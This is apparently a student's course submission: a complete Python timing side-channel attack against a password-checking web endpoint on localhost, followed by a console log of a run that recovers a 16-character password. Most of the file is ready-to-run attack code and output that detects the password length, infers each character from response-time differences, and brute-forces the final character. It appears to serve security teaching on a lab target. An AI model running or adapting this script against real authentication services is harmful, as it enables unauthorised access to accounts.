"""
Timing Side-Channel Attack Implementation
Course: Attacks on Implementations of Secure Systems
Student ID: 316279942

This module implements a timing side-channel attack to crack passwords
by measuring response times from a vulnerable authentication system.
"""

import requests
import time
import logging
from typing import Dict, Optional, List
from dataclasses import dataclass


# ============================================================================
# Configuration Classes
# ============================================================================

@dataclass
class AttackConfig:
    """Configuration parameters for the timing attack."""

    base_url: str = "http://127.0.0.1/"
    user_name: str = "316279942"
    difficulty: int = 1
    max_password_length: int = 32
    charset: str = "abcdefghijklmnopqrstuvwxyz"
    samples_per_test: int = 5

    def get_test_url(self, password: str) -> str:
        """Construct test URL with current parameters."""
        return f"{self.base_url}?user={self.user_name}&password={password}&difficulty={self.difficulty}"


# ============================================================================
# Logging Setup
# ============================================================================

class AttackLogger:
    """Centralized logging for timing attack operations."""

    def __init__(self, log_level: int = logging.INFO):
        self.logger = logging.getLogger("TimingAttack")
        self.logger.setLevel(log_level)

        # Console handler with formatting
        console_handler = logging.StreamHandler()
        console_handler.setLevel(log_level)

        formatter = logging.Formatter(
            '%(asctime)s | %(levelname)-8s | %(message)s',
            datefmt='%H:%M:%S'
        )
        console_handler.setFormatter(formatter)

        self.logger.addHandler(console_handler)

    def info(self, message: str):
        """Log info message."""
        self.logger.info(message)

    def debug(self, message: str):
        """Log debug message."""
        self.logger.debug(message)

    def warning(self, message: str):
        """Log warning message."""
        self.logger.warning(message)

    def error(self, message: str):
        """Log error message."""
        self.logger.error(message)

    def print_separator(self, char: str = "=", length: int = 80):
        """Print a visual separator line."""
        print(char * length)

    def print_header(self, text: str):
        """Print a formatted header."""
        self.print_separator("=")
        print(f"  {text}")
        self.print_separator("=")

    def print_section(self, text: str):
        """Print a formatted section header."""
        self.print_separator("-")
        print(f"  {text}")
        self.print_separator("-")


# ============================================================================
# HTTP Request Handler
# ============================================================================

class RequestHandler:
    """Handles HTTP requests with timing measurements."""

    def __init__(self, logger: AttackLogger):
        self.logger = logger
        self.total_requests = 0

    def send_request(self, url: str) -> requests.Response:
        """
        Send a single HTTP request and return the response.

        Args:
            url: The URL to request

        Returns:
            Response object containing timing and result data
        """
        self.total_requests += 1
        try:
            response = requests.get(url, timeout=10)
            return response
        except requests.RequestException as e:
            self.logger.error(f"Request failed: {e}")
            raise

    def measure_timing(self, url: str, samples: int) -> float:
        """
        Measure average response time over multiple samples.

        Args:
            url: The URL to test
            samples: Number of samples to average

        Returns:
            Average response time in seconds
        """
        total_time = 0.0
        for _ in range(samples):
            response = self.send_request(url)
            total_time += response.elapsed.total_seconds()

        return total_time / samples

    def get_request_count(self) -> int:
        """Return total number of requests made."""
        return self.total_requests


# ============================================================================
# Password Length Detector
# ============================================================================

class PasswordLengthDetector:
    """Detects password length using timing analysis."""

    def __init__(self, config: AttackConfig, request_handler: RequestHandler, logger: AttackLogger):
        self.config = config
        self.request_handler = request_handler
        self.logger = logger

    def detect_length(self) -> int:
        """
        Detect the password length by testing response times for different lengths.

        Returns:
            Detected password length
        """
        self.logger.print_section("PHASE 1: Password Length Detection")

        timing_data: Dict[int, float] = {}

        for length in range(1, self.config.max_password_length + 1):
            test_password = "a" * length
            test_url = self.config.get_test_url(test_password)

            avg_time = self.request_handler.measure_timing(
                test_url,
                self.config.samples_per_test
            )
            timing_data[length] = avg_time

            self.logger.debug(f"Length {length:2d}: {avg_time:.6f}s")

        # Find length with maximum response time
        detected_length = max(timing_data, key=timing_data.get)

        self.logger.info(f"✓ Detected password length: {detected_length} characters")
        self._print_timing_summary(timing_data, detected_length)

        return detected_length

    def _print_timing_summary(self, timing_data: Dict[int, float], detected: int):
        """Print summary of timing measurements."""
        print("\n  Top 5 Candidates by Response Time:")
        sorted_lengths = sorted(timing_data.items(), key=lambda x: x[1], reverse=True)
        for i, (length, time_val) in enumerate(sorted_lengths[:5], 1):
            marker = "◄ SELECTED" if length == detected else ""
            print(f"    {i}. Length {length:2d}: {time_val:.6f}s {marker}")


# ============================================================================
# Character Cracker (with early-stop using learned delta)
# ============================================================================

class CharacterCracker:
    """
    Cracks individual password characters using timing analysis.

    Optimization:
    - Learn the typical timing gap (Δ_step) between the correct character
      and the "normal" characters from previous positions.
    - For later positions, do an early stop: as soon as a character's
      timing is clearly above the others AND matches the expected Δ_step,
      select it without scanning the full alphabet.
    """

    def __init__(self, config: AttackConfig, request_handler: RequestHandler, logger: AttackLogger):
        self.config = config
        self.request_handler = request_handler
        self.logger = logger

        # Learned average gap between winning char and the crowd
        self.estimated_step: Optional[float] = None

        # Early-stop tuning (these work well on local docker)
        self.min_samples_for_decision = 5      # how many chars we want before trusting early-stop
        self.delta_safety_factor = 0.6        # we accept ~60% of estimated_step as "good enough"
        self.min_sigma_multiplier = 3.0       # require candidate to be at least 3σ above mean

    def crack_position(self, current_password: str, password_length: int, position: int) -> str:
        """
        Crack a single character position in the password.

        Uses adaptive early-stop based on previously learned timing gap.
        Falls back to full scan if the signal is unclear.
        """
        self.logger.info(f"Testing position {position}/{password_length}...")

        timing_data: Dict[str, float] = {}
        times_seen: List[float] = []

        best_char = None
        best_time = -1.0

        for idx, char in enumerate(self.config.charset, start=1):
            test_password = self._build_test_password(current_password, char, password_length)
            test_url = self.config.get_test_url(test_password)

            # single-sample (fast) measurement per char in this optimized mode
            total_time = 0.0
            for _ in range(self.config.samples_per_test):
                resp = self.request_handler.send_request(test_url)
                total_time += resp.elapsed.total_seconds()

            avg_time = total_time / self.config.samples_per_test
            timing_data[char] = avg_time
            times_seen.append(avg_time)

            # track current best
            if avg_time > best_time:
                best_time = avg_time
                best_char = char

            # Try early-stop only if we have enough samples
            if idx >= self.min_samples_for_decision:
                if self._should_early_stop(times_seen, best_time, best_char):
                    # We are confident enough to stop scanning more chars
                    break

        # If for some reason best_char is None (shouldn't happen), fallback defensively
        if best_char is None:
            best_char = max(timing_data, key=timing_data.get)

        # Update our estimate of Δ_step using the statistics from this position
        self._update_step_estimate(timing_data, best_char)

        # Print diagnostics only for the chars we actually tested
        self._print_position_results(timing_data, best_char, position)

        return best_char

    # ----------------- helpers -----------------

    def _build_test_password(self, prefix: str, test_char: str, total_length: int) -> str:
        """Build a test password with padding."""
        remaining_length = total_length - len(prefix) - 1
        return prefix + test_char + ("a" * remaining_length)

    def _should_early_stop(self, times_seen: List[float], best_time: float, best_char: str) -> bool:
        """
        Decide whether we can trust the current best character and stop.

        Conditions:
        - Candidate must be significantly above the mean of tested chars.
        - If we have an estimated_step from previous positions, the gap
          should be consistent with it.
        """
        n = len(times_seen)
        if n < self.min_samples_for_decision:
            return False

        mu = sum(times_seen) / n
        # avoid zero-variance edge case
        var = sum((t - mu) ** 2 for t in times_seen) / max(n - 1, 1)
        sigma = var ** 0.5

        gap = best_time - mu

        # Require the candidate to be well above noise
        noise_threshold = self.min_sigma_multiplier * sigma

        # If we already learned a typical step, also require consistency with it
        if self.estimated_step is not None and self.estimated_step > 0:
            history_threshold = self.delta_safety_factor * self.estimated_step
        else:
            history_threshold = 0.0  # no history yet, rely only on sigma

        threshold = max(noise_threshold, history_threshold)

        return gap >= threshold

    def _update_step_estimate(self, timing_data: Dict[str, float], best_char: str):
        """
        Update our estimate of the timing increment caused by one more
        correct character.

        We approximate Δ_step as (t_best - mean_others) for this position,
        and then EMA it into estimated_step.
        """
        if best_char not in timing_data:
            return

        all_times = list(timing_data.values())
        if len(all_times) < 2:
            return

        best_time = timing_data[best_char]
        others = [t for c, t in timing_data.items() if c != best_char]
        mean_others = sum(others) / len(others)

        delta = best_time - mean_others
        if delta <= 0:
            return

        if self.estimated_step is None:
            self.estimated_step = delta
        else:
            # simple exponential moving average
            alpha = 0.5
            self.estimated_step = alpha * delta + (1 - alpha) * self.estimated_step

        # optional: debug log to see how stable it is
        self.logger.debug(f"Updated estimated_step: {self.estimated_step:.6f}s")

    def _print_position_results(self, timing_data: Dict[str, float], best: str, position: int):
        """Print results for current position (for the tested subset)."""
        if not timing_data:
            return

        sorted_chars = sorted(timing_data.items(), key=lambda x: x[1], reverse=True)
        best_time = timing_data[best]

        print(f"\n  Top candidates for position {position}:")
        top_k = min(5, len(sorted_chars))
        for i, (char, time_val) in enumerate(sorted_chars[:top_k], 1):
            diff = time_val - best_time
            marker = "◄ SELECTED" if char == best else ""
            print(f"    {i}. '{char}': {time_val:.6f}s (Δ {diff:+.6f}s) {marker}")


# ============================================================================
# Last Character Verifier
# ============================================================================

class LastCharacterVerifier:
    """Verifies the last character by checking actual authentication."""

    def __init__(self, config: AttackConfig, request_handler: RequestHandler, logger: AttackLogger):
        self.config = config
        self.request_handler = request_handler
        self.logger = logger

    def verify_last_char(self, current_password: str) -> Optional[str]:
        """
        Verify the last character by testing actual authentication.

        Args:
            current_password: Password discovered so far (all except last char)

        Returns:
            The correct last character, or None if not found
        """
        self.logger.print_section(f"PHASE 3: Last Character Verification (Position {len(current_password) + 1})")

        for char in self.config.charset:
            test_password = current_password + char
            test_url = self.config.get_test_url(test_password)

            response = self.request_handler.send_request(test_url)

            if response.text == "1":
                self.logger.info(f"✓ Found correct last character: '{char}'")
                return char

        self.logger.warning("✗ No correct last character found")
        return None


# ============================================================================
# Main Password Cracker
# ============================================================================

class PasswordCracker:
    """Main orchestrator for the password cracking attack."""

    def __init__(self, config: AttackConfig, logger: AttackLogger):
        self.config = config
        self.logger = logger
        self.request_handler = RequestHandler(logger)
        self.length_detector = PasswordLengthDetector(config, self.request_handler, logger)
        self.char_cracker = CharacterCracker(config, self.request_handler, logger)
        self.last_char_verifier = LastCharacterVerifier(config, self.request_handler, logger)

    def crack_from_scratch(self) -> str:
        """
        Crack the entire password from scratch.

        Returns:
            The cracked password
        """
        start_time = time.time()

        self.logger.print_header("TIMING SIDE-CHANNEL PASSWORD CRACKER")
        print(f"  Target User: {self.config.user_name}")
        print(f"  Difficulty: {self.config.difficulty}")
        print(f"  Samples per test: {self.config.samples_per_test}")
        print()

        # Phase 1: Detect password length
        password_length = self.length_detector.detect_length()

        # Phase 2: Crack each character position
        cracked_password = self._crack_all_positions(password_length)

        # Final verification
        elapsed_time = time.time() - start_time
        self._print_final_results(cracked_password, elapsed_time)

        return cracked_password

    def crack_with_resume(self, resume_from: str, password_length: int) -> str:
        """
        Resume cracking from a partially discovered password.

        Args:
            resume_from: Partially discovered password
            password_length: Known password length

        Returns:
            The fully cracked password
        """
        start_time = time.time()

        self.logger.print_header("RESUMING PASSWORD CRACKING")
        print(f"  Target User: {self.config.user_name}")
        print(f"  Difficulty: {self.config.difficulty}")
        print(f"  Resume from: '{resume_from}' (Position {len(resume_from) + 1}/{password_length})")
        print()

        cracked_password = self._crack_from_position(resume_from, password_length)

        elapsed_time = time.time() - start_time
        self._print_final_results(cracked_password, elapsed_time)

        return cracked_password

    def _crack_all_positions(self, password_length: int) -> str:
        """Crack all character positions."""
        self.logger.print_section("PHASE 2: Character Position Cracking")

        current_password = ""

        for position in range(1, password_length + 1):
            # Check if this is the last character
            if position == password_length:
                last_char = self.last_char_verifier.verify_last_char(current_password)
                if last_char:
                    current_password += last_char
                    break

            # Crack current position
            next_char = self.char_cracker.crack_position(
                current_password, password_length, position
            )
            current_password += next_char

            self.logger.info(f"✓ Password progress: '{current_password}' ({len(current_password)}/{password_length})")
            print()

        return current_password

    def _crack_from_position(self, resume_from: str, password_length: int) -> str:
        """Crack remaining positions from resume point."""
        current_password = resume_from
        start_position = len(resume_from) + 1

        for position in range(start_position, password_length + 1):
            # Check if this is the last character
            if position == password_length:
                last_char = self.last_char_verifier.verify_last_char(current_password)
                if last_char:
                    current_password += last_char
                    break

            # Crack current position
            next_char = self.char_cracker.crack_position(
                current_password, password_length, position
            )
            current_password += next_char

            self.logger.info(f"✓ Password progress: '{current_password}' ({len(current_password)}/{password_length})")
            print()

        return current_password

    def _print_final_results(self, password: str, elapsed_time: float):
        """Print final results and statistics."""
        self.logger.print_header("ATTACK COMPLETE")
        print(f"  ✓ CRACKED PASSWORD: '{password}'")
        print(f"  ⏱ Total Time: {elapsed_time:.2f} seconds ({elapsed_time/60:.2f} minutes)")
        print(f"  📊 Total Requests: {self.request_handler.get_request_count()}")
        print(f"  ⚡ Avg Time per Request: {elapsed_time/self.request_handler.get_request_count():.4f}s")
        self.logger.print_separator("=")

    def verify_password(self, password: str) -> bool:
        """
        Verify if a password is correct.

        Args:
            password: Password to verify

        Returns:
            True if password is correct, False otherwise
        """
        test_url = self.config.get_test_url(password)
        response = self.request_handler.send_request(test_url)

        is_correct = response.text == "1"
        status = "✓ CORRECT" if is_correct else "✗ INCORRECT"

        self.logger.info(f"Password verification: {status}")
        self.logger.debug(f"Response time: {response.elapsed.total_seconds():.6f}s")

        return is_correct


# ============================================================================
# Main Execution
# ============================================================================

def main():
    """Main execution function."""

    # Configuration
    config = AttackConfig(
        base_url="http://127.0.0.1/",
        user_name="316279942",
        difficulty=1,
        samples_per_test=2
    )

    # Logger
    logger = AttackLogger(log_level=logging.INFO)

    # Initialize cracker
    cracker = PasswordCracker(config, logger)

    # Option 1: Crack from scratch
    cracked_password = cracker.crack_from_scratch()

    # Option 2: Resume from partial password
    # resume_from = "boovghcfslcajgf"
    # password_length = 16
    # cracked_password = cracker.crack_with_resume(resume_from, password_length)

    # Verify the result
    print()
    logger.print_section("FINAL VERIFICATION")
    cracker.verify_password(cracked_password)


if __name__ == "__main__":
    main()



'''
n.exe "c:/Users/dorfe/OneDrive/Desktop/Projects_2025/Milumentor/Masters/Atacks/Atcks Drill 1/atck_try copy.py"
================================================================================
  TIMING SIDE-CHANNEL PASSWORD CRACKER
================================================================================
  Target User: 316279942
  Difficulty: 1
  Samples per test: 1

--------------------------------------------------------------------------------
  PHASE 1: Password Length Detection
--------------------------------------------------------------------------------
12:03:02 | INFO     | ✓ Detected password length: 16 characters

  Top 5 Candidates by Response Time:
    1. Length 16: 0.512953s ◄ SELECTED
    2. Length  5: 0.025983s
    3. Length 28: 0.025842s
    4. Length  8: 0.025730s
    5. Length 24: 0.015913s
--------------------------------------------------------------------------------
  PHASE 2: Character Position Cracking
--------------------------------------------------------------------------------
12:03:02 | INFO     | Testing position 1/16...

  Top candidates for position 1:
    1. 'b': 0.773559s (Δ +0.000000s) ◄ SELECTED
    2. 'k': 0.534630s (Δ -0.238929s)
    3. 'g': 0.533801s (Δ -0.239758s)
    4. 'j': 0.530185s (Δ -0.243374s)
    5. 'e': 0.529657s (Δ -0.243902s)
12:03:08 | INFO     | ✓ Password progress: 'b' (1/16)

12:03:08 | INFO     | Testing position 2/16...

  Top candidates for position 2:
    1. 'o': 1.011821s (Δ +0.000000s) ◄ SELECTED
    2. 'i': 0.782350s (Δ -0.229471s)
    3. 'a': 0.781406s (Δ -0.230415s)
    4. 'n': 0.780201s (Δ -0.231620s)
    5. 'j': 0.779970s (Δ -0.231851s)
12:03:20 | INFO     | ✓ Password progress: 'bo' (2/16)

12:03:20 | INFO     | Testing position 3/16...

  Top candidates for position 3:
    1. 'o': 1.290336s (Δ +0.000000s) ◄ SELECTED
    2. 'j': 1.032513s (Δ -0.257823s)
    3. 'l': 1.029889s (Δ -0.260447s)
    4. 'a': 1.028938s (Δ -0.261398s)
    5. 'f': 1.028727s (Δ -0.261609s)
12:03:36 | INFO     | ✓ Password progress: 'boo' (3/16)

12:03:36 | INFO     | Testing position 4/16...

  Top candidates for position 4:
    1. 'v': 1.525785s (Δ +0.000000s) ◄ SELECTED
    2. 'n': 1.286235s (Δ -0.239550s)
    3. 'e': 1.285334s (Δ -0.240451s)
    4. 't': 1.285288s (Δ -0.240497s)
    5. 'c': 1.284717s (Δ -0.241068s)
12:04:04 | INFO     | ✓ Password progress: 'boov' (4/16)

12:04:04 | INFO     | Testing position 5/16...

  Top candidates for position 5:
    1. 'g': 1.777163s (Δ +0.000000s) ◄ SELECTED
    2. 'j': 1.537413s (Δ -0.239750s)
    3. 'c': 1.528938s (Δ -0.248225s)
    4. 'k': 1.527526s (Δ -0.249637s)
    5. 'b': 1.526493s (Δ -0.250670s)
12:04:21 | INFO     | ✓ Password progress: 'boovg' (5/16)

12:04:21 | INFO     | Testing position 6/16...

  Top candidates for position 6:
    1. 'h': 2.021369s (Δ +0.000000s) ◄ SELECTED
    2. 'j': 1.787946s (Δ -0.233423s)
    3. 'e': 1.782355s (Δ -0.239014s)
    4. 'k': 1.781104s (Δ -0.240265s)
    5. 'a': 1.780531s (Δ -0.240838s)
12:04:43 | INFO     | ✓ Password progress: 'boovgh' (6/16)

12:04:43 | INFO     | Testing position 7/16...

  Top candidates for position 7:
    1. 'c': 2.257074s (Δ +0.000000s) ◄ SELECTED
    2. 'l': 2.031029s (Δ -0.226045s)
    3. 'k': 2.029522s (Δ -0.227552s)
    4. 'd': 2.026697s (Δ -0.230377s)
    5. 'h': 2.019979s (Δ -0.237095s)
12:05:07 | INFO     | ✓ Password progress: 'boovghc' (7/16)

12:05:07 | INFO     | Testing position 8/16...

  Top candidates for position 8:
    1. 'f': 2.539121s (Δ +0.000000s) ◄ SELECTED
    2. 'h': 2.282531s (Δ -0.256590s)
    3. 'd': 2.280020s (Δ -0.259101s)
    4. 'c': 2.279967s (Δ -0.259154s)
    5. 'b': 2.275250s (Δ -0.263871s)
12:05:32 | INFO     | ✓ Password progress: 'boovghcf' (8/16)

12:05:32 | INFO     | Testing position 9/16...

  Top candidates for position 9:
    1. 's': 2.774563s (Δ +0.000000s) ◄ SELECTED
    2. 'q': 2.535957s (Δ -0.238606s)
    3. 'o': 2.533036s (Δ -0.241527s)
    4. 'b': 2.532762s (Δ -0.241801s)
    5. 'g': 2.530956s (Δ -0.243607s)
12:06:21 | INFO     | ✓ Password progress: 'boovghcfs' (9/16)

12:06:21 | INFO     | Testing position 10/16...

  Top candidates for position 10:
    1. 'l': 3.021522s (Δ +0.000000s) ◄ SELECTED
    2. 'h': 2.789021s (Δ -0.232501s)
    3. 'b': 2.783986s (Δ -0.237536s)
    4. 'c': 2.779574s (Δ -0.241948s)
    5. 'g': 2.776532s (Δ -0.244990s)
12:06:54 | INFO     | ✓ Password progress: 'boovghcfsl' (10/16)

12:06:54 | INFO     | Testing position 11/16...

  Top candidates for position 11:
    1. 'c': 3.531600s (Δ +0.000000s) ◄ SELECTED
    2. 'j': 3.031012s (Δ -0.500588s)
    3. 'a': 3.028602s (Δ -0.502998s)
    4. 'f': 3.026868s (Δ -0.504732s)
    5. 'h': 3.025068s (Δ -0.506532s)
12:07:28 | INFO     | ✓ Password progress: 'boovghcfslc' (11/16)

12:07:28 | INFO     | Testing position 12/16...

  Top candidates for position 12:
    1. 'a': 3.516320s (Δ +0.000000s) ◄ SELECTED
    2. 'e': 3.286626s (Δ -0.229694s)
    3. 'b': 3.286165s (Δ -0.230155s)
    4. 'k': 3.286126s (Δ -0.230194s)
    5. 'i': 3.284143s (Δ -0.232177s)
12:08:37 | INFO     | ✓ Password progress: 'boovghcfslca' (12/16)

12:08:37 | INFO     | Testing position 13/16...

  Top candidates for position 13:
    1. 'j': 3.778436s (Δ +0.000000s) ◄ SELECTED
    2. 'd': 3.538356s (Δ -0.240080s)
    3. 'k': 3.538266s (Δ -0.240170s)
    4. 'f': 3.532139s (Δ -0.246297s)
    5. 'l': 3.531993s (Δ -0.246443s)
12:09:19 | INFO     | ✓ Password progress: 'boovghcfslcaj' (13/16)

12:09:19 | INFO     | Testing position 14/16...

  Top candidates for position 14:
    1. 'g': 4.015559s (Δ +0.000000s) ◄ SELECTED
    2. 'l': 3.784415s (Δ -0.231144s)
    3. 'b': 3.779523s (Δ -0.236036s)
    4. 'a': 3.776319s (Δ -0.239240s)
    5. 'f': 3.774986s (Δ -0.240573s)
12:10:05 | INFO     | ✓ Password progress: 'boovghcfslcajg' (14/16)

12:10:05 | INFO     | Testing position 15/16...

  Top candidates for position 15:
    1. 'f': 4.268747s (Δ +0.000000s) ◄ SELECTED
    2. 'g': 4.033351s (Δ -0.235396s)
    3. 'k': 4.032863s (Δ -0.235884s)
    4. 'h': 4.021475s (Δ -0.247272s)
    5. 'e': 4.020545s (Δ -0.248202s)
12:10:53 | INFO     | ✓ Password progress: 'boovghcfslcajgf' (15/16)

--------------------------------------------------------------------------------
  PHASE 3: Last Character Verification (Position 16)
--------------------------------------------------------------------------------
12:12:23 | INFO     | ✓ Found correct last character: 'u'
================================================================================
  ATTACK COMPLETE
================================================================================
  ✓ CRACKED PASSWORD: 'boovghcfslcajgfu'
  ⏱ Total Time: 562.16 seconds (9.37 minutes)
  📊 Total Requests: 262
  ⚡ Avg Time per Request: 2.1456s
================================================================================

--------------------------------------------------------------------------------
  FINAL VERIFICATION
--------------------------------------------------------------------------------
12:12:27 | INFO     | Password verification: ✓ CORRECT
PS C:\Users\dorfe\OneDrive\Desktop\Projects_2025\Milumentor\Masters\Atacks\Atcks Drill 1>
'''